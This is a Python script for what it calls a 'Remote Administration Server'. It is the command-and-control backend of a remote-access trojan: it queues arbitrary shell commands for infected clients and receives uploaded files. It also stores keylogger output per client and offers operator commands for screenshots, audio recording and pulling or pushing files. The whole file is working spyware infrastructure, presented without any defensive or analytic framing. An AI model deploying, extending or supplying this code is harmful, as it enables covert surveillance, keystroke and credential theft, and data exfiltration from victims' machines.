from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import os
import json
import threading
import time
import queue
import mimetypes
import shutil

class RemoteServerHandler(BaseHTTPRequestHandler):
    # Global command queue for each client
    command_queues = {}
    active_clients = {}
    
    def do_GET(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        query = parse_qs(parsed_path.query)
        
        # Get client ID from headers or query parameters
        client_id = self.headers.get('X-Client-ID', 'default')
        if 'client_id' in query:
            client_id = query['client_id'][0]
        
        # Track active clients on every request
        if client_id not in self.active_clients:
            self.active_clients[client_id] = {
                'last_seen': time.time(),
                'dir': 'unknown'
            }
            print(f"[+] New client connected: {client_id}")
        else:
            self.active_clients[client_id]['last_seen'] = time.time()
        
        if path == '/test':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Server is running')
            print(f"[*] Test request from {client_id}")
            
        elif path == '/command':
            # Get command for this client
            if client_id not in self.command_queues:
                self.command_queues[client_id] = queue.Queue()
            
            try:
                # Get command from queue with timeout
                command = self.command_queues[client_id].get(timeout=0.5)
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(command.encode('utf-8'))
                print(f"[->] Sent command to {client_id}: {command}")
            except queue.Empty:
                # No command available - send empty response
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'')
                
        elif path.startswith('/download/'):
            # Send file to client
            filename = path[10:]  # Remove '/download/' prefix
            filepath = os.path.join('files', filename)
            
            if os.path.exists(filepath):
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                self.end_headers()
                
                with open(filepath, 'rb') as f:
                    shutil.copyfileobj(f, self.wfile)
                print(f"[<-] Sent file to {client_id}: {filename}")
            else:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        query = parse_qs(parsed_path.query)
        
        # Get client ID from headers or query parameters
        client_id = self.headers.get('X-Client-ID', 'default')
        if 'client_id' in query:
            client_id = query['client_id'][0]
        
        # Track active clients
        if client_id not in self.active_clients:
            self.active_clients[client_id] = {
                'last_seen': time.time(),
                'dir': 'unknown'
            }
            print(f"[+] New client connected: {client_id}")
        else:
            self.active_clients[client_id]['last_seen'] = time.time()
        
        if path == '/data':
            # Receive data from client
            content_length = int(self.headers['Content-Length'])
            data = self.rfile.read(content_length).decode('utf-8')
            
            # Handle different types of messages
            if data.startswith('CONNECTED:'):
                dir_path = data.split(':', 1)[1].strip()
                self.active_clients[client_id]['dir'] = dir_path
                print(f"[+] Client {client_id} connected from: {dir_path}")
            elif data.startswith('DIR_CHANGED:'):
                dir_path = data.split(':', 1)[1].strip()
                self.active_clients[client_id]['dir'] = dir_path
                print(f"[*] Client {client_id} changed directory to: {dir_path}")
            elif data.startswith('COMMAND_COMPLETE'):
                # Command execution completed
                pass
            elif data.startswith('KEYLOG:'):
                # Handle keylog data
                keylog_data = data[7:].strip()  # Remove "KEYLOG:" prefix
                self.save_keylog(client_id, keylog_data)
            elif data.startswith('ERROR:'):
                print(f"[!] Error from {client_id}: {data}")
            else:
                # Print regular output
                print(f"[{client_id}] {data}", end='')
            
            self.send_response(200)
            self.end_headers()
            
        elif path == '/upload':
            # Receive file from client
            content_type = self.headers.get('Content-Type', '')
            content_length = int(self.headers.get('Content-Length', 0))
            
            print(f"[DEBUG] Upload request from {client_id}")
            print(f"[DEBUG] Content-Type: {content_type}")
            print(f"[DEBUG] Content-Length: {content_length}")
            
            if 'multipart/form-data' in content_type:
                # Parse multipart form data
                boundary = content_type.split('boundary=')[1].encode('utf-8')
                
                # Create files directory if it doesn't exist
                os.makedirs('received_files', exist_ok=True)
                
                # Read data in chunks for large files (like audio recordings)
                data = b''
                chunk_size = 8192
                bytes_read = 0
                
                while bytes_read < content_length:
                    remaining = content_length - bytes_read
                    chunk = self.rfile.read(min(chunk_size, remaining))
                    if not chunk:
                        break
                    data += chunk
                    bytes_read += len(chunk)
                
                print(f"[DEBUG] Received {bytes_read} bytes total")
                
                # Extract filename and file data
                parts = data.split(b'--' + boundary)
                for part in parts:
                    if b'filename=' in part:
                        # Extract filename
                        filename_start = part.find(b'filename="') + 10
                        filename_end = part.find(b'"', filename_start)
                        filename = part[filename_start:filename_end].decode('utf-8')
                        
                        # Extract file data
                        file_data_start = part.find(b'\r\n\r\n') + 4
                        file_data_end = part.rfind(b'\r\n')
                        file_data = part[file_data_start:file_data_end]
                        
                        print(f"[DEBUG] Extracted filename: {filename}")
                        print(f"[DEBUG] File data size: {len(file_data)} bytes")
                        
                        # Save file
                        filepath = os.path.join('received_files', filename)
                        with open(filepath, 'wb') as f:
                            f.write(file_data)
                        
                        print(f"[<-] File received from {client_id}: {filename} ({len(file_data)} bytes)")
                        break
                
                self.send_response(200)
                self.end_headers()
            else:
                print(f"[DEBUG] Invalid content type for upload")
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def save_keylog(self, client_id, keylog_data):
        """Save keylog data to a file"""
        # Create keylogs directory if it doesn't exist
        os.makedirs('keylogs', exist_ok=True)
        
        # Create a keylog file for each client
        keylog_file = os.path.join('keylogs', f"{client_id.replace(':', '_')}.txt")
        
        # Get current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        # Write to keylog file
        with open(keylog_file, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {keylog_data}\n")
        
        print(f"[+] Keylog saved from {client_id}: {keylog_data}")
    
    def log_message(self, format, *args):
        # Suppress default HTTP logging (we have custom logging)
        pass

class RemoteServer:
    def __init__(self, host='0.0.0.0', port=4011):
        self.host = host
        self.port = port
        self.server = HTTPServer((host, port), RemoteServerHandler)
        self.active_client = None
        self.output_dir = "received_files"
        self.keylog_dir = "keylogs"
        
        # Create output directories if they don't exist
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.keylog_dir, exist_ok=True)
        os.makedirs('files', exist_ok=True)
        
    def start(self):
        print(f"[*] Server listening on {self.host}:{self.port}")
        print(f"[*] Waiting for clients to connect...")
        self.server.serve_forever()
    
    def list_clients(self):
        current_time = time.time()
        print("\nConnected clients:")
        
        if not RemoteServerHandler.active_clients:
            print("  (no clients connected)")
        
        for i, (client_id, info) in enumerate(RemoteServerHandler.active_clients.items()):
            if isinstance(info, dict):
                dir_path = info.get('dir', 'unknown')
                last_seen = info.get('last_seen', 0)
                age = int(current_time - last_seen)
                status = "ACTIVE" if client_id == self.active_client else ""
                print(f"  {i+1}. {client_id} - {dir_path} (last seen: {age}s ago) {status}")
            else:
                status = "ACTIVE" if client_id == self.active_client else ""
                print(f"  {i+1}. {client_id} {status}")
        print()
    
    def switch_client(self, client_index):
        client_ids = list(RemoteServerHandler.active_clients.keys())
        if 0 <= client_index < len(client_ids):
            self.active_client = client_ids[client_index]
            print(f"[+] Switched to client: {self.active_client}")
        else:
            print("[-] Invalid client index")
    
    def send_command(self, command):
        if self.active_client is None:
            print("[-] No active client selected. Use 'switch <num>' to select a client.")
            return
        
        if self.active_client not in RemoteServerHandler.command_queues:
            RemoteServerHandler.command_queues[self.active_client] = queue.Queue()
        
        RemoteServerHandler.command_queues[self.active_client].put(command)
        print(f"[+] Command queued for {self.active_client}: {command}")
    
    def pull_file(self, remote_path):
        """Pull a file from the client to the server"""
        if not self.active_client:
            print("[-] No active client")
            return
        
        print(f"[*] Requesting file: {remote_path}")
        self.send_command(f"pull {remote_path}")
    
    def send_file(self, local_path, remote_path=None):
        """Send a file from the server to the client"""
        if not self.active_client:
            print("[-] No active client")
            return
        
        if not os.path.exists(local_path):
            print(f"[-] File not found: {local_path}")
            return
        
        # If remote path not specified, use just the filename from local path
        if not remote_path:
            remote_path = os.path.basename(local_path)
        
        # Copy file to files directory
        server_file_path = os.path.join('files', os.path.basename(remote_path))
        shutil.copy2(local_path, server_file_path)
        
        print(f"[*] Sending file: {local_path} -> {remote_path}")
        
        # Send the send command with remote path and size
        file_size = os.path.getsize(local_path)
        self.send_command(f"send {remote_path} {file_size}")
    
    def view_keylogs(self, client_id=None):
        """View keylogs for a specific client or all clients"""
        if client_id:
            keylog_file = os.path.join(self.keylog_dir, f"{client_id.replace(':', '_')}.txt")
            if os.path.exists(keylog_file):
                print(f"\n=== Keylogs for {client_id} ===")
                with open(keylog_file, 'r', encoding='utf-8') as f:
                    print(f.read())
                print("============================\n")
            else:
                print(f"[-] No keylogs found for client {client_id}")
        else:
            # Show all keylog files
            print("\n=== Available Keylog Files ===")
            for filename in os.listdir(self.keylog_dir):
                if filename.endswith('.txt'):
                    client_id_from_file = filename.replace('.txt', '').replace('_', ':')
                    print(f"- {client_id_from_file}")
            print("============================\n")
    
    def interactive_shell(self):
        print("\n[*] Starting interactive shell...")
        print("[*] Type 'help' for available commands\n")
        
        while True:
            try:
                if self.active_client:
                    client_info = RemoteServerHandler.active_clients.get(self.active_client, {})
                    if isinstance(client_info, dict):
                        dir_path = client_info.get('dir', 'unknown')
                        prompt = f"[{self.active_client}:{dir_path}]> "
                    else:
                        prompt = f"[{self.active_client}]> "
                else:
                    prompt = "[no client]> "
                
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command == "help":
                    print("\nServer Commands:")
                    print("  help           - Show this help message")
                    print("  list           - List connected clients")
                    print("  switch <num>   - Switch to client by number")
                    print("  exit           - Exit the server")
                    print("\nClient Commands (require active client):")
                    print("  screenshot     - Take screenshot from active client")
                    print("  record [sec]   - Record audio from active client")
                    print("  pull <path>    - Pull a file from client to server")
                    print("  send <lpath> [rpath] - Send a file from server to client")
                    print("  pwd            - Show current directory")
                    print("  ls [path]      - List directory contents")
                    print("  cd <path>      - Change directory")
                    print("  keylogs        - View keylogs from active client")
                    print("  keylogs all    - View keylogs from all clients")
                    print("  Any other command will be sent to the client\n")
                
                elif command == "list":
                    self.list_clients()
                
                elif command.startswith("switch "):
                    try:
                        client_index = int(command.split()[1]) - 1
                        self.switch_client(client_index)
                    except (IndexError, ValueError):
                        print("[-] Usage: switch <client number>")
                
                elif command == "screenshot":
                    self.send_command("screenshot")
                
                elif command.startswith("record "):
                    duration = command.split()[1] if len(command.split()) > 1 else "10"
                    self.send_command(f"record {duration}")
                
                elif command == "record":
                    self.send_command("record 10")
                
                elif command.startswith("pull "):
                    remote_path = command.split(' ', 1)[1]
                    self.pull_file(remote_path)
                
                elif command.startswith("send "):
                    parts = command.split(' ', 2)
                    if len(parts) >= 2:
                        local_path = parts[1]
                        remote_path = parts[2] if len(parts) > 2 else None
                        self.send_file(local_path, remote_path)
                    else:
                        print("[-] Usage: send <local_path> [remote_path]")
                
                elif command == "keylogs":
                    if self.active_client:
                        self.view_keylogs(self.active_client)
                    else:
                        print("[-] No active client selected")
                
                elif command == "keylogs all":
                    self.view_keylogs()
                
                elif command == "exit":
                    print("[*] Shutting down server...")
                    break
                
                else:
                    # Send any other command to the client
                    self.send_command(command)
            
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

def main():
    print("=" * 60)
    print(" Remote Administration Server (HTTP)")
    print("=" * 60)
    
    server = RemoteServer()
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()
    
    # Wait for server to start
    time.sleep(1)
    
    # Start interactive shell
    server.interactive_shell()

if __name__ == "__main__":
    main()